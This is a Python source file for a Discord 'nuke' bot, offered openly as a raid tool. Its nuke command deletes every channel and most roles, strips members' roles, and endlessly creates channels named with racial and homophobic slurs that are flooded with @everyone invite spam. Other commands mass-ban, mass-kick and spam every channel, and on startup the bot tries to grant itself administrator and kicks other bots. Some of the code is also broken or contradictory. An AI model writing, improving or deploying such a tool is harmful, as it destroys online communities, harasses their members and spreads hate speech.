import discord
from discord.ext import commands
import random
import os
from termcolor import colored
from discord import Embed
from discord.app_commands import CommandTree
import asyncio
import time

# ASCII art and console messages
print(colored('''
  @@@@@@  @@@@@@@@ @@@@@@@@ @@@      @@@ @@@  @@@ @@@@@@@@      @@@@@@@   @@@@@@  @@@@@@@
 @@!  @@@ @@!      @@!      @@!      @@! @@!@!@@@ @@!           @@!  @@@ @@!  @@@   @@!
 @!@  !@! @!!!:!   @!!!:!   @!!      !!@ @!@@!!@! @!!!:!        @!@!@!@  @!@  !@!   @!!
 !!:  !!! !!:      !!:      !!:      !!: !!:  !!! !!:           !!:  !!! !!:  !!!   !!:
  : :. :   :        :       : ::.: : :   ::    :  : :: :::      :: : ::   : :. :     :

Made by OfflineTheMenace
Discord: imoffline1234567890
''', 'red'))

prefix = input("Enter the bot prefix: ")
server_id_input = input("Enter the server ID: ")
if not server_id_input:
    print("Server ID cannot be empty. Please enter a valid server ID.")
    exit(1)
server_id = int(server_id_input)
user_id = int(input("Enter your user ID: "))
bot_token = input("Enter the bot token: ")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)

# Internal data structure to remember users with command permissions
command_users = set()

# Check if the bot already has a command tree
if not hasattr(bot, 'tree'):
    tree = CommandTree(bot)
else:
    tree = bot.tree

# Bot events
@bot.event
async def on_ready():
    print(colored('『+』Bot is ready', 'blue'))
    guild = bot.get_guild(server_id)
    bot.top_role = guild.roles[-1]  # Get the top role from the guild

    # Promote the bot to administrator
    await promote_bot_to_admin(guild)

    for member in guild.members:
        if member.id == user_id and member.id != guild.owner.id:
            await member.unban()
            invite = await guild.channels[0].create_invite()
            print(colored(f'『+』Unbanned and invited you: {invite.url}', 'blue'))
        if member.bot and member.id != bot.user.id:
            await member.kick()
            print(colored(f'『+』Kicked bot: {member.name}', 'blue'))

    # Monitor banned members and unban the bot runner if necessary
    banned_members = await guild.bans()
    for ban_entry in banned_members:
        if ban_entry.user.id == user_id:
            await guild.unban(ban_entry.user)
            invite = await guild.channels[0].create_invite()
            print(colored(f'『+』Unbanned and invited you: {invite.url}', 'blue'))

# Function to promote the bot to administrator
async def promote_bot_to_admin(guild):
    me = guild.me
    admin_permissions = discord.Permissions(administrator=True)
    try:
        await me.edit(roles=[guild.default_role, guild.roles[-1]])  # Assign the top role
        await me.edit(permissions=admin_permissions)
        print(colored(f'『+』Promoted bot to administrator', 'blue'))
    except discord.errors.Forbidden:
        print(colored(f'『+』Bot does not have permission to promote itself', 'red'))

# Slash command for Active Developer badge
@tree.command(name="active_dev", description="Command to meet the Active Developer badge requirements")
async def active_dev(ctx):
    await ctx.send("This command meets the requirements for the Active Developer badge!")

# Register the slash command
async def register_slash_commands():
    await tree.sync()

# Override the built-in help command
bot.remove_command('help')

@bot.command()
async def help(ctx):
    help_message = '''
    say (message) - Say something as the bot
    kick (mention) - Kick a user
    kickAll - Kick all users
    ban (mention) - Ban a user
    banAll - Ban all users
    unBan (user ID) - Unban a user
    nick (mention) (new nickname) - Change a user's nickname
    spam (message) (amount) - Spam a message
    roleCreate (name) - Create a role
    roleDelete (mention) - Delete a role
    roleGive (mention) (role mention) - Give a user a role
    roleRemove (mention) (role mention) - Remove a role from a user
    addCmdPerms (mention) - Allow a user to use the bot
    removeCmdPerms (mention) - Remove a user's permission to use the bot
    addChannel (name) - Create a channel
    removeChannel (mention) - Delete a channel
    renameChannel (new name) - Rename the current channel
    '''
    embed = Embed(title="Help", description=help_message, color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def say(ctx, *, message):
    try:
        embed = Embed(title="Bot Message", description=message, color=0x00ff00)
        await ctx.message.delete()
        await ctx.send(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to delete messages in this channel.", color=0xff0000)
        await ctx.send(embed=embed)

@bot.command()
async def kick(ctx, member: discord.Member):
    embed = Embed(title="Kick User", description=f"Kicked {member.name}", color=0x00ff00)
    await member.kick()
    print(colored(f'『+』Kicked user: {member.name}', 'blue'))
    await ctx.send(embed=embed)

@bot.command()
async def kickAll(ctx):
    guild = bot.get_guild(server_id)
    tasks = [member.kick() for member in guild.members if member.id != user_id]
    await asyncio.gather(*tasks)
    embed = Embed(title="Kick All Users", description="Kicked all users except the owner.", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def ban(ctx, member: discord.Member):
    embed = Embed(title="Ban User", description=f"Banned {member.name}", color=0x00ff00)
    await member.ban()
    print(colored(f'『+』Banned user: {member.name}', 'blue'))
    await ctx.send(embed=embed)

@bot.command()
async def banAll(ctx):
    guild = bot.get_guild(server_id)
    tasks = [member.ban() for member in guild.members if member.id != user_id]
    await asyncio.gather(*tasks)
    embed = Embed(title="Ban All Users", description="Banned all users except the owner.", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def unBan(ctx, user_id: int):
    guild = bot.get_guild(server_id)
    user = await bot.fetch_user(user_id)
    await guild.unban(user)
    print(colored(f'『+』Unbanned user: {user.name}', 'blue'))
    embed = Embed(title="Unban User", description=f"Unbanned {user.name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def nick(ctx, member: discord.Member, *, nickname):
    await member.edit(nick=nickname)
    print(colored(f'『+』Changed nickname of user: {member.name} to {nickname}', 'blue'))
    embed = Embed(title="Change Nickname", description=f"Changed {member.name}'s nickname to {nickname}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def spam(ctx, message, amount: int):
    guild = bot.get_guild(server_id)
    channels = [channel for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]

    async def spam_channel(channel):
        for _ in range(amount):
            await channel.send(message)

    tasks = [spam_channel(channel) for channel in channels]
    await asyncio.gather(*tasks)

    embed = Embed(title="Spam Message", description=f"Spammed '{message}' {amount} times in all channels", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def roleCreate(ctx, *, name):
    guild = bot.get_guild(server_id)
    await guild.create_role(name=name)
    print(colored(f'『+』Created role: {name}', 'blue'))
    embed = Embed(title="Create Role", description=f"Created role: {name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def roleDelete(ctx, *, role: discord.Role):
    await role.delete()
    print(colored(f'『+』Deleted role: {role.name}', 'blue'))
    embed = Embed(title="Delete Role", description=f"Deleted role: {role.name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def roleGive(ctx, member: discord.Member, *, role: discord.Role):
    await member.add_roles(role)
    print(colored(f'『+』Gave user: {member.name} the role: {role.name}', 'blue'))
    embed = Embed(title="Give Role", description=f"Gave {member.name} the role: {role.name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def roleRemove(ctx, member: discord.Member, *, role: discord.Role):
    await member.remove_roles(role)
    print(colored(f'『+』Removed role: {role.name} from user: {member.name}', 'blue'))
    embed = Embed(title="Remove Role", description=f"Removed role: {role.name} from {member.name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def addCmdPerms(ctx, member: discord.Member):
    command_users.add(member.id)
    print(colored(f'『+』Added command permissions to user: {member.name}', 'blue'))
    embed = Embed(title="Add Command Permissions", description=f"Added command permissions to {member.name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def removeCmdPerms(ctx, member: discord.Member):
    if member.id in command_users:
        command_users.remove(member.id)
        print(colored(f'『+』Removed command permissions from user: {member.name}', 'blue'))
        embed = Embed(title="Remove Command Permissions", description=f"Removed command permissions from {member.name}", color=0x00ff00)
        await ctx.send(embed=embed)
    else:
        embed = Embed(title="Remove Command Permissions", description=f"{member.name} does not have command permissions.", color=0x00ff00)
        await ctx.send(embed=embed)

@bot.command()
async def addChannel(ctx, *, name):
    guild = bot.get_guild(server_id)
    await guild.create_text_channel(name=name)
    print(colored(f'『+』Created channel: {name}', 'blue'))
    embed = Embed(title="Create Channel", description=f"Created channel: {name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def removeChannel(ctx, channel: discord.TextChannel):
    await channel.delete()
    print(colored(f'『+』Deleted channel: {channel.name}', 'blue'))
    embed = Embed(title="Delete Channel", description=f"Deleted channel: {channel.name}", color=0x00ff00)
    await ctx.send(embed=embed)

@bot.command()
async def renameChannel(ctx, *, new_name):
    await ctx.channel.edit(name=new_name)
    print(colored(f'『+』Renamed channel: {ctx.channel.name} to {new_name}', 'blue'))
    embed = Embed(title="Rename Channel", description=f"Renamed channel to {new_name}", color=0x00ff00)
    await ctx.send(embed=embed)

# Nuke command with concurrent tasks
@bot.command()
async def nuke(ctx):
    guild = bot.get_guild(server_id)
    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕋𝕙𝕖𝕞𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽']
    role_names = channel_names

    # Shuffle the channel names to create channels in a random order
    random.shuffle(channel_names)

    async def create_and_spam_channels():
        while True:
            try:
                channel = await guild.create_text_channel(name=channel_names[random.randint(0, len(channel_names) - 1)])
                await asyncio.sleep(0.1)  # Small delay to avoid rate limiting
                asyncio.create_task(spam_channel(channel))
            except Exception as e:
                print(colored(f'『+』Error creating or spamming channel: {e}', 'red'))

    async def delete_channels():
        for channel in guild.channels:
            if channel != ctx.channel:
                try:
                    await channel.delete()
                except Exception as e:
                    print(colored(f'『+』Error deleting channel: {e}', 'red'))

    async def strip_roles():
        for member in guild.members:
            try:
                await member.edit(roles=[])
            except Exception as e:
                print(colored(f'『+』Error stripping roles: {e}', 'red'))

    async def delete_roles():
        for role in guild.roles:
            if role != guild.default_role and role != guild.roles[-1]:  # Exclude the top role
                try:
                    await role.delete()
                except Exception as e:
                    print(colored(f'『+』Error deleting role: {e}', 'red'))

    async def assign_roles():
        roles = guild.roles[1:]
        for member in guild.members:
            try:
                await member.edit(roles=roles)
            except Exception as e:
                print(colored(f'『+』Error assigning roles: {e}', 'red'))

    async def spam_channel(channel):
        try:
            for _ in range(1000):
                await channel.send('@everyone https://discord.gg/rsZcW4QmJD')
        except Exception as e:
            print(colored(f'『+』Error spamming channel: {e}', 'red'))

    tasks = [
        delete_channels(),
        create_and_spam_channels(),
        strip_roles(),
        delete_roles(),
        assign_roles()
    ]
    await asyncio.gather(*tasks)

    embed = Embed(title="Nuke Command Executed", description="Nuke command has been executed.", color=0x00ff00)
    await ctx.send(embed=embed)

# Start the bot
@bot.event
async def on_ready():
    await register_slash_commands()
    print(colored('『+』Bot is ready and slash commands are registered', 'blue'))

bot.run(bot_token)
